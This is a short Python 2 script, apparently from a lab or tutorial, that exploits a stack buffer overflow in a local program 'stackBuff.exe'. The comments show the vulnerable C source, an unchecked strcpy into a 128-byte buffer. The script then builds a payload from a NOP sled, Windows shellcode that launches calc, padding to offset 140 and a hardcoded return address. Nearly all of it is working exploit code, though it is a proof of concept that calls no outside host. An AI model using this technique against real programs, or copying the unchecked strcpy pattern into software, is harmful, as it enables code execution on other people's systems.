import os,subprocess, struct
#include <string.h>
#include <stdio.h>
#
#void do_something(char *Buffer)
#{
#	char MyVar[128];
#	strcpy(MyVar, Buffer);
#}
#Main program
#int main(int argc, char **argv)
#{
#	do_something(argv[1]);
#	printf("Done\n");
#}


print "Init buffer overflow"

shellcode = ("\x31\xC9"
"\x51"
"\x68\x63\x61\x6C\x63"
"\x54"  
"\xB8\xC7\x93\xBF\x77"
"\xFF\xD0")

junk = "\x90\x90"+shellcode
junk +="A"*(140 -len(junk));
junk += struct.pack("<L", 0x7c9159b8)
junk +="C"* (200 -len(junk))

#### shellcodeAAAAA.........AAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

print junk
debuggercmd="C:\\Archivos de programa\\Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe";
proc = subprocess.call(["stackBuff.exe",junk])
